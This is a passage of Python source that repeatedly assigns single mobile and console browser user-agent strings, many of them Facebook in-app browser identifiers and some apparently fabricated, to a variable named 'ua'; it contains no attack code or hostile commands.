    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.77 Mobile Safari/537.36 EdgA/100.0.1185.50']
ua = [
    'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.77 Mobile Safari/537.36 EdgA/100.0.1185.50']
ua = [
    'Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 Edge/40.15254.603']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 EdgiOS/100.1185.50 Mobile/15E148 Safari/605.1.15']
ua = [
    'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-T357H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4594.110 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; PPA-LX1; HMSCore 6.6.0.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; AGR-L09; HMSCore 6.6.0.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; POT-LX1; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; VKY-L09; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; JEF-NX9; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.3.314 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; INE-LX2; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.6.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.3.314 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36  (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; ELE-L04; HMSCore 6.6.0.352; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; MAR-LX1A; HMSCore 6.6.0.351; GMSCore 21.48.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+']
ua = [
    'Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36;]']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.2; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36;]']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/238.0.0.41.116;]']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L01A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; MP17 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; 22122RK93C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = [
    'Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0; CAM-UL00 Build/HONORCAM-UL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]']
ua = [
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0.2; HTC Desire Eye Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; V1936A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.4.1;FBSS/3; FBCR/csl.;FBID/phone;FBLC/en_US;FBOP/5]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/418.0.0.11.71;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.1.1 Chrome/114.0.5735.61 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/350.0.0.5.116;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A505W Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5356a [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/320.0.0.12.108;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]']
ua = [
    'Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/318.0.0.16.105;]']
ua = [
    'Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; XIAOMI POCO X2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.0.4']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/357.0.0.12.72;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/362.0.0.10.67;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; CPH2481 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; FRL-L23 Build/HUAWEIFRL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/353.0.0.34.116;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; FRL-L23; HMSCore 6.8.0.331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/355.0.0.21.108;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-E225F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102']
ua = [
    'Mozilla/5.0 (Linux; Android 12; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102']
ua = [
    'Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104']
ua = [
    'Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5669.73 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5326.82 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5479.49 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5903.48 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4777.63 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.3011.34 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4336.91 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5565.86 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.4342.48 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.3242.85 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3495.98 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5260.45 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4573.22 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5046.74 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.3767.91 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.3275.69 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; 11; Windows NT 10.0N50G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4520.72 Chrome/109.0.0.0 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102']
ua = [
    'Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/373.1.0.8.104']
ua = [
    'Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108']
ua = [
    'Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/238.0.0.41.116;]']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L01A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; MP17 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; 22122RK93C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = [
